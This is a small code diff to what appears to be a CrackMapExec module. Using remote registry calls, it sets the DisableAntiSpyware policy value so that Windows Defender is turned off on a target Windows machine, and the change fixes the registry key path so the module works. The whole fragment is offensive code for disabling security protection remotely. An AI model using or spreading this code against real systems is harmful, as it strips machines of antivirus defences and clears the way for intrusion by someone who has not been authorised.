@@ -63,7 +63,7 @@ class CMEModule:
         ans = rrp.hOpenLocalMachine(remoteOps._RemoteOperations__rrp)
         regHandle = ans['phKey']
 
-        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender')
+        ans = rrp.hBaseRegOpenKey(remoteOps._RemoteOperations__rrp, regHandle, 'SOFTWARE\\Policies\\Microsoft\\Windows Defender')
         keyHandle = ans['phkResult']
 
         rrp.hBaseRegSetValue(remoteOps._RemoteOperations__rrp, keyHandle, 'DisableAntiSpyware\x00',  rrp.REG_DWORD, 1)
